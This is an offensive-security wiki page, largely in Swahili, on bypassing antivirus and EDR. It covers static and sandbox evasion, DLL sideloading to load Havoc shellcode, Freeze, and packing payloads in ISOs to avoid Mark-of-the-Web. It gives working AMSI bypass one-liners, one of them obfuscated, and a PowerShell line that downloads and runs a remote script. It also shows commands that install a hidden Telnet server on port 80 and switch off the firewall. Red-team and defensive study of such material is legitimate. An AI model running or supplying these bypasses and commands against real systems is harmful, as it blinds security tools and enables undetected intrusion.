# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Ukurasa huu umeandikwa na** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## **AV Evasion Methodology**

Hivi sasa, AVs hutumia mbinu tofauti za kuangalia kama faili ni hatari au la, ugunduzi wa statiki, uchambuzi wa dinamik, na kwa EDRs za hali ya juu, uchambuzi wa tabia.

### **Static detection**

Ugunduzi wa statiki unapatikana kwa kuweka alama kwenye nyuzi au safu za byte zinazojulikana kuwa hatari katika binary au script, na pia kutoa taarifa kutoka kwa faili yenyewe (mfano: maelezo ya faili, jina la kampuni, saini za kidijitali, ikoni, checksum, n.k.). Hii inamaanisha kwamba kutumia zana za umma zinazojulikana kunaweza kukufanya ukamatwe kwa urahisi zaidi, kwani huenda zimechambuliwa na kuwekwa alama kama hatari. Kuna njia kadhaa za kuzunguka aina hii ya ugunduzi:

- **Encryption**

Ikiwa unashughulikia binary, hakutakuwa na njia kwa AV kugundua programu yako, lakini utahitaji aina fulani ya loader ili kufungua na kuendesha programu hiyo kwenye kumbukumbu.

- **Obfuscation**

Wakati mwingine unachohitaji kufanya ni kubadilisha nyuzi fulani katika binary yako au script ili kuipita AV, lakini hii inaweza kuwa kazi inayochukua muda kulingana na kile unachojaribu kuficha.

- **Custom tooling**

Ikiwa unaunda zana zako mwenyewe, hakutakuwa na saini mbaya zinazojulikana, lakini hii inachukua muda na juhudi nyingi.

> [!NOTE]
> Njia nzuri ya kuangalia dhidi ya ugunduzi wa statiki wa Windows Defender ni [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Kimsingi inagawanya faili katika sehemu nyingi kisha inamwambia Defender kuchanganua kila moja kwa moja, kwa njia hii, inaweza kukuambia ni zipi zilizowekwa alama katika binary yako.

Ninapendekeza uangalie hii [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) kuhusu AV Evasion ya vitendo.

### **Dynamic analysis**

Uchambuzi wa dinamik ni wakati AV inakimbia binary yako katika sandbox na kuangalia shughuli hatari (mfano: kujaribu kufungua na kusoma nywila za kivinjari chako, kufanya minidump kwenye LSASS, n.k.). Sehemu hii inaweza kuwa ngumu kidogo kufanya kazi nayo, lakini hapa kuna mambo kadhaa unayoweza kufanya ili kuzuia sandboxes.

- **Sleep before execution** Kutegemea jinsi ilivyotekelezwa, inaweza kuwa njia nzuri ya kupita uchambuzi wa dinamik wa AV. AVs zina muda mfupi sana wa kuchanganua faili ili zisihusishe na mtumiaji, hivyo kutumia usingizi mrefu kunaweza kuingilia uchambuzi wa binaries. Tatizo ni kwamba sandboxes nyingi za AV zinaweza tu kupuuza usingizi kulingana na jinsi ilivyotekelezwa.
- **Checking machine's resources** Kawaida Sandboxes zina rasilimali chache sana za kufanya kazi (mfano: < 2GB RAM), vinginevyo zinaweza kuharibu mashine ya mtumiaji. Unaweza pia kuwa mbunifu sana hapa, kwa mfano kwa kuangalia joto la CPU au hata kasi za mashabiki, si kila kitu kitatekelezwa katika sandbox.
- **Machine-specific checks** Ikiwa unataka kulenga mtumiaji ambaye kituo chake kimeunganishwa kwenye eneo la "contoso.local", unaweza kufanya ukaguzi kwenye eneo la kompyuta ili kuona kama linalingana na lile ulilosema, ikiwa halilingani, unaweza kufanya programu yako itoke.

Inageuka kuwa jina la kompyuta la Microsoft Defender's Sandbox ni HAL9TH, hivyo, unaweza kuangalia jina la kompyuta katika malware yako kabla ya kulipua, ikiwa jina linalingana na HAL9TH, inamaanisha uko ndani ya sandbox ya defender, hivyo unaweza kufanya programu yako itoke.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>chanzo: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Vidokezo vingine vizuri kutoka [@mgeeky](https://twitter.com/mariuszbit) kwa kupambana na Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Kama tulivyosema hapo awali katika chapisho hili, **ztools za umma** hatimaye **zitagundulika**, hivyo, unapaswa kujiuliza kitu:

Kwa mfano, ikiwa unataka kudump LSASS, **je, unahitaji kweli kutumia mimikatz**? Au unaweza kutumia mradi mwingine ambao haujulikani sana na pia unadump LSASS.

Jibu sahihi labda ni la pili. Kuchukua mimikatz kama mfano, huenda ni moja ya, ikiwa si kipande cha malware kinachowekwa alama zaidi na AVs na EDRs, wakati mradi wenyewe ni mzuri sana, pia ni ndoto mbaya kufanya kazi nayo ili kuzunguka AVs, hivyo angalia tu mbadala kwa kile unachojaribu kufikia.

> [!NOTE]
> Unapobadilisha payloads zako kwa ajili ya kuzuia, hakikisha **unazima uwasilishaji wa sampuli kiotomatiki** katika defender, na tafadhali, kwa dhati, **USIWEKE KATIKA VIRUSTOTAL** ikiwa lengo lako ni kufikia kuzuia kwa muda mrefu. Ikiwa unataka kuangalia ikiwa payload yako inagundulika na AV fulani, i-install kwenye VM, jaribu kuzima uwasilishaji wa sampuli kiotomatiki, na uijaribu huko hadi uridhike na matokeo.

## EXEs vs DLLs

Kila wakati inapowezekana, daima **kipa kipaumbele kutumia DLLs kwa ajili ya kuzuia**, katika uzoefu wangu, faili za DLL kwa kawaida **huzuiliwa kidogo** na kuchambuliwa, hivyo ni hila rahisi sana kutumia ili kuepuka kugundulika katika baadhi ya matukio (ikiwa payload yako ina njia yoyote ya kuendesha kama DLL bila shaka).

Kama tunavyoona katika picha hii, Payload ya DLL kutoka Havoc ina kiwango cha kugundulika cha 4/26 katika antiscan.me, wakati payload ya EXE ina kiwango cha kugundulika cha 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me kulinganisha payload ya kawaida ya Havoc EXE dhidi ya payload ya kawaida ya Havoc DLL</p></figcaption></figure>

Sasa tutakuonyesha hila kadhaa unazoweza kutumia na faili za DLL ili kuwa na ufanisi zaidi.

## DLL Sideloading & Proxying

**DLL Sideloading** inatumia faida ya mpangilio wa utafutaji wa DLL unaotumiwa na loader kwa kuweka programu ya mwathirika na payload hatari pamoja.

Unaweza kuangalia programu zinazoweza kuathirika na DLL Sideloading kwa kutumia [Siofra](https://github.com/Cybereason/siofra) na script ifuatayo ya powershell:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Hii amri itatoa orodha ya programu zinazoweza kuathiriwa na DLL hijacking ndani ya "C:\Program Files\\" na faili za DLL wanazojaribu kupakia.

Ninapendekeza sana **uchunguze programu zinazoweza kuathiriwa na DLL Hijackable/Sideloadable mwenyewe**, mbinu hii ni ya siri sana ikiwa itafanywa vizuri, lakini ukitumia programu zinazojulikana za DLL Sideloadable, unaweza kukamatwa kwa urahisi.

Kuweka tu DLL mbaya yenye jina ambalo programu inatarajia kupakia, haitapakia mzigo wako, kwani programu inatarajia baadhi ya kazi maalum ndani ya DLL hiyo, ili kutatua tatizo hili, tutatumia mbinu nyingine inayoitwa **DLL Proxying/Forwarding**.

**DLL Proxying** inasambaza simu ambazo programu inafanya kutoka kwa proxy (na mbaya) DLL hadi DLL asilia, hivyo kuhifadhi kazi ya programu na kuwa na uwezo wa kushughulikia utekelezaji wa mzigo wako.

Nitakuwa nikitumia mradi wa [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) kutoka [@flangvik](https://twitter.com/Flangvik/)

Hizi ndizo hatua nilizofuata:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Amri ya mwisho itatupa faili 2: kiolezo cha msimbo wa chanzo wa DLL, na DLL iliyobadilishwa jina asilia. 

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Mbili zetu shellcode (iliyopangwa na [SGN](https://github.com/EgeBalci/sgn)) na proxy DLL zina kiwango cha Ugunduzi cha 0/26 katika [antiscan.me](https://antiscan.me)! Ningesema hiyo ni mafanikio.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!NOTE]
> Ninapendekeza **sana** uangalie [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) kuhusu DLL Sideloading na pia [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) ili kujifunza zaidi kuhusu kile tulichozungumzia kwa undani zaidi.

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze ni toolkit ya payload kwa ajili ya kupita EDRs kwa kutumia michakato iliyositishwa, syscalls za moja kwa moja, na mbinu mbadala za utekelezaji`

Unaweza kutumia Freeze kupakia na kutekeleza shellcode yako kwa njia ya siri.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!NOTE]
> Kuepuka ni mchezo wa paka na panya, kile kinachofanya kazi leo kinaweza kugunduliwa kesho, hivyo usitegemee zana moja tu, ikiwa inawezekana, jaribu kuunganisha mbinu kadhaa za kuepuka.

## AMSI (Msingi wa Skanning ya Anti-Malware)

AMSI ilianzishwa ili kuzuia "[malware isiyo na faili](https://en.wikipedia.org/wiki/Fileless_malware)". Awali, AVs zilikuwa na uwezo wa kuskan **faili kwenye diski**, hivyo ikiwa ungeweza kwa namna fulani kutekeleza payloads **moja kwa moja katika kumbukumbu**, AV haingeweza kufanya chochote kuzuia hilo, kwani haikuwa na mwonekano wa kutosha.

Kipengele cha AMSI kimejumuishwa katika sehemu hizi za Windows.

- Udhibiti wa Akaunti ya Mtumiaji, au UAC (kuinua EXE, COM, MSI, au usakinishaji wa ActiveX)
- PowerShell (scripts, matumizi ya mwingiliano, na tathmini ya msimbo wa dynamic)
- Windows Script Host (wscript.exe na cscript.exe)
- JavaScript na VBScript
- Office VBA macros

Inaruhusu suluhisho za antivirus kuchunguza tabia ya script kwa kufichua maudhui ya script katika mfumo ambao haujaandikwa na haujaeleweka.

Kukimbia `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` kutazalisha onyo lifuatalo kwenye Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Tazama jinsi inavyoweka `amsi:` na kisha njia ya executable ambayo script ilikimbia, katika kesi hii, powershell.exe

Hatukuacha faili yoyote kwenye diski, lakini bado tulikamatwa katika kumbukumbu kwa sababu ya AMSI.

Zaidi ya hayo, kuanzia na **.NET 4.8**, msimbo wa C# unakimbizwa kupitia AMSI pia. Hii inathiri hata `Assembly.Load(byte[])` ili kupakia utekelezaji wa ndani. Ndio maana kutumia toleo la chini la .NET (kama 4.7.2 au chini) inapendekezwa kwa utekelezaji wa ndani ikiwa unataka kuepuka AMSI.

Kuna njia kadhaa za kuzunguka AMSI:

- **Obfuscation**

Kwa kuwa AMSI inafanya kazi hasa na kugundua kwa statiki, hivyo, kubadilisha scripts unazojaribu kupakia inaweza kuwa njia nzuri ya kuepuka kugunduliwa.

Hata hivyo, AMSI ina uwezo wa kufichua scripts hata ikiwa ina tabaka kadhaa, hivyo obfuscation inaweza kuwa chaguo mbaya kulingana na jinsi inavyofanywa. Hii inafanya kuwa si rahisi kuepuka. Ingawa, wakati mwingine, unachohitaji kufanya ni kubadilisha majina kadhaa ya mabadiliko na utakuwa sawa, hivyo inategemea ni kiasi gani kitu kimewekwa alama.

- **AMSI Bypass**

Kwa kuwa AMSI inatekelezwa kwa kupakia DLL katika mchakato wa powershell (pia cscript.exe, wscript.exe, nk), inawezekana kuingilia kati kwa urahisi hata ukiendesha kama mtumiaji asiye na mamlaka. Kutokana na kasoro hii katika utekelezaji wa AMSI, watafiti wamegundua njia kadhaa za kuepuka skanning ya AMSI.

**Kulazimisha Kosa**

Kulazimisha kuanzishwa kwa AMSI kufeli (amsiInitFailed) kutasababisha kwamba hakuna skanning itakayofanywa kwa mchakato wa sasa. Awali hii ilifunuliwa na [Matt Graeber](https://twitter.com/mattifestation) na Microsoft imeunda saini ili kuzuia matumizi makubwa.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Ilichukua tu mstari mmoja wa msimbo wa powershell kufanya AMSI isitumike kwa mchakato wa sasa wa powershell. Mstari huu umewekwa alama na AMSI yenyewe, hivyo mabadiliko fulani yanahitajika ili kutumia mbinu hii.

Hapa kuna AMSI bypass iliyobadilishwa niliyopata kutoka kwa hii [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Kumbuka, kwamba hii itakuwa na uwezekano wa kuangaziwa mara hii chapisho litakapochapishwa, hivyo usichapishe msimbo ikiwa mpango wako ni kubaki bila kugundulika.

**Memory Patching**

Tekniki hii iligunduliwa awali na [@RastaMouse](https://twitter.com/_RastaMouse/) na inahusisha kutafuta anwani ya kazi "AmsiScanBuffer" katika amsi.dll (inayohusika na kusafisha ingizo lililotolewa na mtumiaji) na kuandika tena na maagizo ya kurudisha msimbo wa E_INVALIDARG, kwa njia hii, matokeo ya kusafisha halisi yatarudisha 0, ambayo inatafsiriwa kama matokeo safi.

> [!NOTE]
> Tafadhali soma [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) kwa maelezo zaidi.

Pia kuna mbinu nyingi nyingine zinazotumika kupita AMSI kwa kutumia powershell, angalia [**hii ukurasa**](basic-powershell-for-pentesters/index.html#amsi-bypass) na [**hii repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) kujifunza zaidi kuhusu hizo.

Zana hii [**https://github.com/Flangvik/AMSI.fail**](https://github.com/Flangvik/AMSI.fail) pia inazalisha skripti za kupita AMSI.

**Ondoa saini iliyogundulika**

Unaweza kutumia zana kama **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** na **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** kuondoa saini ya AMSI iliyogundulika kutoka kwenye kumbukumbu ya mchakato wa sasa. Zana hii inafanya kazi kwa kusafisha kumbukumbu ya mchakato wa sasa kwa saini ya AMSI na kisha kuandika tena na maagizo ya NOP, kwa ufanisi kuondoa kutoka kwenye kumbukumbu.

**AV/EDR bidhaa zinazotumia AMSI**

Unaweza kupata orodha ya bidhaa za AV/EDR zinazotumia AMSI katika **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Tumia toleo la Powershell 2**
Ikiwa unatumia toleo la PowerShell 2, AMSI haitapakiwa, hivyo unaweza kuendesha skripti zako bila kusafishwa na AMSI. Unaweza kufanya hivi:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging ni kipengele kinachokuwezesha kurekodi amri zote za PowerShell zinazotekelezwa kwenye mfumo. Hii inaweza kuwa na manufaa kwa ajili ya ukaguzi na kutatua matatizo, lakini pia inaweza kuwa **tatizo kwa washambuliaji wanaotaka kuepuka kugundulika**.

Ili kupita PowerShell logging, unaweza kutumia mbinu zifuatazo:

- **Zima PowerShell Transcription na Module Logging**: Unaweza kutumia chombo kama [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) kwa ajili ya hili.
- **Tumia PowerShell toleo la 2**: Ikiwa unatumia PowerShell toleo la 2, AMSI haitapakiwa, hivyo unaweza kuendesha skripti zako bila kuskenwa na AMSI. Unaweza kufanya hivi: `powershell.exe -version 2`
- **Tumia Sehemu ya PowerShell Isiyo na Usimamizi**: Tumia [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) kuanzisha PowerShell bila ulinzi (hii ndiyo inatumika na `powerpick` kutoka Cobalt Strike).

## Obfuscation

> [!NOTE]
> Mbinu kadhaa za obfuscation zinategemea kupeleka data, ambayo itaongeza entropy ya binary ambayo itafanya iwe rahisi kwa AVs na EDRs kuigundua. Kuwa makini na hili na labda tumia encryption tu kwa sehemu maalum za msimbo wako ambazo ni nyeti au zinahitaji kufichwa.

Kuna zana kadhaa ambazo zinaweza kutumika ku **obfuscate C# clear-text code**, kuunda **metaprogramming templates** za kukusanya binaries au **obfuscate compiled binaries** kama vile:

- [**ConfuserEx**](https://github.com/yck1509/ConfuserEx): Ni obfuscator mzuri ya chanzo wazi kwa ajili ya programu za .NET. Inatoa mbinu mbalimbali za ulinzi kama vile obfuscation ya mtiririko wa kudhibiti, anti-debugging, anti-tampering, na encryption ya nyuzi. Inapendekezwa kwa sababu inaruhusu hata obfuscate sehemu maalum za msimbo.
- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Lengo la mradi huu ni kutoa fork ya chanzo wazi ya [LLVM](http://www.llvm.org/) suite ya kukusanya inayoweza kutoa usalama wa programu ulioongezeka kupitia [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) na kuzuia mabadiliko.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator inaonyesha jinsi ya kutumia lugha ya `C++11/14` kuunda, wakati wa kukusanya, msimbo uliofichwa bila kutumia chombo chochote cha nje na bila kubadilisha mkusanyaji.
- [**obfy**](https://github.com/fritzone/obfy): Ongeza safu ya operesheni zilizofichwa zinazozalishwa na mfumo wa metaprogramming wa C++ template ambao utaifanya maisha ya mtu anayetaka kuvunja programu kuwa magumu kidogo.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz ni obfuscator ya binary x64 inayoweza kuficha aina mbalimbali za faili za pe ikiwa ni pamoja na: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame ni injini rahisi ya metamorphic code kwa ajili ya executable zisizo na mipaka.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator ni mfumo wa obfuscation wa msimbo wa kiwango kidogo kwa lugha zinazoungwa mkono na LLVM kwa kutumia ROP (return-oriented programming). ROPfuscator inaficha programu kwenye kiwango cha msimbo wa assembly kwa kubadilisha maagizo ya kawaida kuwa ROP chains, ikizuia dhana yetu ya kawaida ya mtiririko wa kudhibiti.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt ni .NET PE Crypter iliyoandikwa kwa Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor ina uwezo wa kubadilisha EXE/DLL zilizopo kuwa shellcode na kisha kuzipeleka

## SmartScreen & MoTW

Huenda umekutana na skrini hii unaposhusha baadhi ya executable kutoka mtandao na kuziendesha.

Microsoft Defender SmartScreen ni mekanizma ya usalama iliyokusudiwa kulinda mtumiaji wa mwisho dhidi ya kuendesha programu zinazoweza kuwa na madhara.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen inafanya kazi hasa kwa njia ya msingi wa sifa, ikimaanisha kwamba programu zisizokuwa za kawaida zinazoshushwa zitaanzisha SmartScreen na hivyo kuonya na kuzuia mtumiaji wa mwisho kutekeleza faili hiyo (ingawa faili hiyo bado inaweza kutekelezwa kwa kubofya More Info -> Run anyway).

**MoTW** (Mark of The Web) ni [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) yenye jina la Zone.Identifier ambayo huundwa kiotomatiki wakati wa kushusha faili kutoka mtandao, pamoja na URL ambayo ilishushwa kutoka.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Kukagua Zone.Identifier ADS kwa faili iliyoshushwa kutoka mtandao.</p></figcaption></figure>

> [!NOTE]
> Ni muhimu kutambua kwamba executable zilizosainiwa kwa cheti cha **kuaminika** **hazitazindua SmartScreen**.

Njia yenye ufanisi sana ya kuzuia payloads zako kupata Mark of The Web ni kwa kuzifunga ndani ya aina fulani ya kontena kama ISO. Hii inatokea kwa sababu Mark-of-the-Web (MOTW) **haiwezi** kutumika kwa **volumes zisizo za NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) ni chombo kinachofunga payloads katika kontena za matokeo ili kuepuka Mark-of-the-Web.

Mfano wa matumizi:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) ni mekanizma yenye nguvu ya kurekodi katika Windows inayoruhusu programu na vipengele vya mfumo **kurekodi matukio**. Hata hivyo, inaweza pia kutumika na bidhaa za usalama kufuatilia na kugundua shughuli mbaya.

Kama ilivyo kwa jinsi AMSI inavyoweza kuzuiwa (kuzidiwa), pia inawezekana kufanya **`EtwEventWrite`** kazi ya mchakato wa nafasi ya mtumiaji irejee mara moja bila kurekodi matukio yoyote. Hii inafanywa kwa kubadilisha kazi hiyo katika kumbukumbu ili irejee mara moja, kwa ufanisi ikizima kurekodi ETW kwa mchakato huo.

Unaweza kupata maelezo zaidi katika **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.

## C# Assembly Reflection

Kuingiza binaries za C# katika kumbukumbu kumekuwa kujulikana kwa muda mrefu na bado ni njia nzuri sana ya kuendesha zana zako za baada ya unyakuzi bila kukamatwa na AV.

Kwa kuwa payload itapakiwa moja kwa moja katika kumbukumbu bila kugusa diski, tutahitaji tu kuwa na wasiwasi kuhusu kubadilisha AMSI kwa mchakato mzima.

Mifumo mingi ya C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, nk.) tayari inatoa uwezo wa kutekeleza makusanyo ya C# moja kwa moja katika kumbukumbu, lakini kuna njia tofauti za kufanya hivyo:

- **Fork\&Run**

Inahusisha **kuanzisha mchakato mpya wa dhabihu**, ingiza msimbo wako mbaya wa baada ya unyakuzi katika mchakato huo mpya, tekeleza msimbo wako mbaya na unapomaliza, uue mchakato mpya. Hii ina faida na hasara zake. Faida ya njia ya fork na run ni kwamba utekelezaji unafanyika **nje** ya mchakato wetu wa Beacon implant. Hii ina maana kwamba ikiwa kitu katika hatua zetu za baada ya unyakuzi kitatokea vibaya au kukamatwa, kuna **uwezekano mkubwa zaidi** wa **implant yetu kuishi.** Hasara ni kwamba una **uwezekano mkubwa zaidi** wa kukamatwa na **Mikakati ya Tabia**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Ni kuhusu kuingiza msimbo mbaya wa baada ya unyakuzi **katika mchakato wake mwenyewe**. Kwa njia hii, unaweza kuepuka kuunda mchakato mpya na kuupitisha kwa AV, lakini hasara ni kwamba ikiwa kitu kitatokea vibaya na utekelezaji wa payload yako, kuna **uwezekano mkubwa zaidi** wa **kupoteza beacon yako** kwani inaweza kuanguka.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!NOTE]
> Ikiwa unataka kusoma zaidi kuhusu upakiaji wa C# Assembly, tafadhali angalia makala hii [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) na BOF yao ya InlineExecute-Assembly ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Unaweza pia kupakia C# Assemblies **kutoka PowerShell**, angalia [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) na [video ya S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Kama ilivyopendekezwa katika [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), inawezekana kutekeleza msimbo mbaya kwa kutumia lugha nyingine kwa kutoa mashine iliyovunjwa **ufikiaji wa mazingira ya tafsiri yaliyoanzishwa kwenye sehemu ya SMB inayodhibitiwa na Mshambuliaji**.

Kwa kuruhusu ufikiaji wa Binaries za Mfasiri na mazingira kwenye sehemu ya SMB unaweza **kutekeleza msimbo wowote katika hizi lugha ndani ya kumbukumbu** ya mashine iliyovunjwa.

Repo inaonyesha: Defender bado inachunguza scripts lakini kwa kutumia Go, Java, PHP nk tuna **uwezo zaidi wa kupita saini za statiki**. Kujaribu na scripts za shell za nyuma zisizo na ufichuzi katika hizi lugha kumethibitishwa kuwa na mafanikio.

## TokenStomping

Token stomping ni mbinu inayomruhusu mshambuliaji **kubadilisha token ya ufikiaji au bidhaa ya usalama kama EDR au AV**, ikiwaruhusu kupunguza haki zake ili mchakato usife lakini hautakuwa na ruhusa ya kuangalia shughuli mbaya.

Ili kuzuia hili Windows inaweza **kuzuia michakato ya nje** kupata kushughulikia token za michakato ya usalama.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Advanced Evasion

Evasion ni mada ngumu sana, wakati mwingine unahitaji kuzingatia vyanzo vingi tofauti vya telemetry katika mfumo mmoja, hivyo ni vigumu kabisa kubaki bila kugundulika katika mazingira yaliyoendelea.

Kila mazingira unayokabiliana nayo yatakuwa na nguvu na udhaifu wake.

Ninawashauri sana uangalie hotuba hii kutoka [@ATTL4S](https://twitter.com/DaniLJ94), ili kupata ufahamu wa mbinu za juu za Evasion.

{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

hii pia ni hotuba nyingine nzuri kutoka [@mariuszbit](https://twitter.com/mariuszbit) kuhusu Evasion kwa Undani.

{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Unaweza kutumia [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) ambayo it **ondoa sehemu za binary** hadi **ipate sehemu ambayo Defender** inakuta kuwa mbaya na kuigawanya kwako.\
Zana nyingine inayofanya **kitu sawa ni** [**avred**](https://github.com/dobin/avred) ikiwa na wavuti wazi inayotoa huduma katika [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Hadi Windows10, Windows zote zilikuja na **Telnet server** ambayo unaweza kufunga (kama msimamizi) kwa kufanya:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Fanya iwe **anzishwe** wakati mfumo unapoanzishwa na **iendeshe** sasa:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Badilisha bandari ya telnet** (stealth) na kuzima firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Download it from: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (unataka upakuaji wa bin, si usanidi)

**KATIKA HOST**: Tekeleza _**winvnc.exe**_ na uweke server:

- Wezesha chaguo _Disable TrayIcon_
- Weka nenosiri katika _VNC Password_
- Weka nenosiri katika _View-Only Password_
